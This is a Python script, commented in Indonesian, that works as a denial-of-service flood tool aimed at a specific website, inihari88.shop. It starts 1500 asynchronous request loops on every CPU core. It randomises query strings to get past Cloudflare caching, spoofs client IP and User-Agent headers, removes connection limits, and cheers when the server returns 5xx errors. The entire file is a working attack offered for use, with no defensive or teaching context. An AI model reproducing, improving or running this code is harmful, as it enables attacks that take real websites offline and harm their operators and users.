import asyncio
import aiohttp
import random
import string
import multiprocessing

TARGET_BASE = "https://inihari88.shop/"

def get_random_str(length=40):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def overlord_task(session):
    while True:
        try:
            # Bypass Cloudflare Cache dengan URL yang sangat dinamis
            url = f"{TARGET_BASE}?s={get_random_str()}&t={random.random()}"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {get_random_str(5)}",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            }

            # Gunakan HEAD atau POST untuk membebani resource parsing server
            async with session.get(url, headers=headers, timeout=10) as r:
                status = r.status
                if status >= 500:
                    print(f"[🔥] 5xx DETECTED! SERVER DYING | Status: {status}")
                else:
                    print(f"[*] Overlord Hit | Status: {status}")
                
                # Baca sedikit data lalu buang
                await r.content.read(1)
        except:
            await asyncio.sleep(0.001)

def start_engine():
    # Inisialisasi loop asinkron di setiap proses/core
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def ignite():
        # Connector agresif: No limit per host
        connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=600)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Tiap core akan menangani 1000-2000 koneksi
            tasks = [overlord_task(session) for _ in range(1500)]
            await asyncio.gather(*tasks)
    
    loop.run_until_complete(ignite())

if __name__ == "__main__":
    cores = multiprocessing.cpu_count()
    print(f"🔱 INVOKING THE OVERLORD ON {cores} CORES 🔱")
    print("WARNING: MAXIMUM NETWORK SATURATION INITIATED")
    
    processes = []
    try:
        for i in range(cores):
            p = multiprocessing.Process(target=start_engine)
            p.daemon = True
            p.start()
            processes.append(p)
            print(f"[+] Engine Core {i} Ignited!")
        
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Stopped.")
